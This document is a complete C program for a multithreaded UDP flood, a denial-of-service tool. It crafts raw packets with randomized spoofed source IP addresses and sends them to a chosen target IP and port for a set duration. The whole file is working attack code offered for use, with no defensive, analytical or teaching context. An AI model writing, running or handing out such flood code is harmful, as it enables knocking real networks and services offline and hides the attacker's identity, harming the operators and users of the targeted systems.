#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <pthread.h>
#include <time.h>

// UDP pseudo header for checksum
struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t proto;
    uint16_t length;
};

struct thread_data {
    char *target_ip;
    int port;
    int duration;
};

// Checksum calculation
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

// Generate random spoofed IP
uint32_t random_ip() {
    return (rand() % 254 + 1) |                    // Avoid 0 and 255
           ((rand() % 256) << 8) |
           ((rand() % 256) << 16) |
           ((rand() % 256) << 24);
}

// Attack function
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        pthread_exit(NULL);
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(data->port);
    dest.sin_addr.s_addr = inet_addr(data->target_ip);

    // Fixed payload
    const char *payload_data = "Spoofed UDP packet!";
    int payload_len = strlen(payload_data);

    time_t end = time(NULL) + data->duration;

    while (time(NULL) < end) {
        char datagram[4096];
        memset(datagram, 0, sizeof(datagram));

        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
        char *payload = (char *)udph + sizeof(struct udphdr);

        memcpy(payload, payload_data, payload_len);

        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = random_ip();  // Already in network byte order
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

        // UDP Header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(data->port);
        udph->len = htons(sizeof(struct udphdr) + payload_len);
        udph->check = 0;

        // UDP Checksum with pseudo-header
        struct pseudo_header psh;
        psh.src = iph->saddr;
        psh.dst = iph->daddr;
        psh.zero = 0;
        psh.proto = IPPROTO_UDP;
        psh.length = udph->len;  // Already in network byte order

        int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;
        char *pseudogram = malloc(psize);
        if (!pseudogram) continue;

        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + payload_len);

        udph->check = checksum((unsigned short *)pseudogram, psize);
        free(pseudogram);

        // Send packet
        if (sendto(sock, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("sendto");
        }

        // Optional: small delay to avoid overwhelming CPU
        // usleep(10);
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <ip> <port> <duration> <threads>\n", argv[0]);
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (port <= 0 || port > 65535) {
        fprintf(stderr, "Invalid port number.\n");
        exit(1);
    }

    srand(time(NULL));

    pthread_t *tids = malloc(threads * sizeof(pthread_t));
    if (!tids) {
        perror("malloc");
        exit(1);
    }

    printf("Starting spoofed UDP flood on %s:%d for %d seconds with %d threads...\n",
           ip, port, duration, threads);

    // Create one data struct per thread to avoid race conditions
    struct thread_data *thread_args = malloc(threads * sizeof(struct thread_data));
    if (!thread_args) {
        perror("malloc");
        free(tids);
        exit(1);
    }

    for (int i = 0; i < threads; i++) {
        thread_args[i].target_ip = ip;
        thread_args[i].port = port;
        thread_args[i].duration = duration;
        if (pthread_create(&tids[i], NULL, attack, &thread_args[i]) != 0) {
            perror("pthread_create");
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }

    free(tids);
    free(thread_args);

    printf("Flood finished.\n");
    return 0;
}